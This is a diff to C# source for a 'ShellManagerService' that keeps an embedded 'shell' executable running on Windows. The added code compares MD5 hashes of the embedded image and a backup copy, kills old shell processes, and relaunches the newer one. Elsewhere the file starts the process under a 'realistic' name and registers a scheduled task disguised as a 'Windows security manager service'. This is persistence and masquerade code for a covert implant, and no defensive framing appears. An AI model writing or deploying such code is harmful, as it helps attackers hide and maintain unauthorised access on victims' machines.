@@ -4,6 +4,7 @@ using System.IO;
 using System.Linq;
 using System.Threading;
 using Microsoft.Win32.TaskScheduler;
+using System.Security.Cryptography;
 
 namespace ShellManagerService
 {
@@ -21,12 +22,30 @@ namespace ShellManagerService
             //Call the process with some "realistic" name
             string tmp_name = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, exe_name);
 
-            //Check if shell is already running
             Process[] pname = Process.GetProcessesByName(exe_name);
-            if(pname.Length > 0) //Shell is running
+            if (GetMD5HashFromFile(backup_shell_folder + backup_shell_name) != GetMD5HashFromBuffer(embedded_image_1))
             {
-                return;
+		//If hashes don't match it means the service holds a newer version, so kill all instances of the shell and backup
+		Process[] backup_shells = Process.GetProcessesByName(backup_shell_name);
+		foreach(var proc in backup_shells)
+		{
+		    proc.Kill();
+		}
+                foreach(var process in pname)
+                {
+                    process.Kill();
+                }
             }
+            else
+            {
+                //Check if shell is already running
+
+                if (pname.Length > 0) //Shell is running
+                {
+                    return;
+                }
+            }
+
             //else delete the file
             File.Delete(tmp_name);
 
@@ -101,6 +120,34 @@ namespace ShellManagerService
                     .Starting(DateTime.Now.AddSeconds(3))
                     .AsTask("Windows security manager service is used to check health and integrity of important system resources and must be run regularly.");
             }
+        }
+        public static string GetMD5HashFromFile(string fileName)
+        {
+            try
+            {
+                using (var md5 = MD5.Create())
+                {
+                    using (var stream = File.OpenRead(fileName))
+                    {
+                        return BitConverter.ToString(md5.ComputeHash(stream)).Replace("-", string.Empty);
+                    }
+                }
+            }
+            catch { return string.Empty; }
+        }
+        public static string GetMD5HashFromBuffer(byte[] bytes)
+        {
+            try
+            {
+                using (var md5 = MD5.Create())
+                {
+                    using (var stream = new MemoryStream(bytes))
+                    {
+                        return BitConverter.ToString(md5.ComputeHash(stream)).Replace("-", string.Empty);
+                    }
+                }
+            }
+            catch { return string.Empty; }
         }
     }
 }
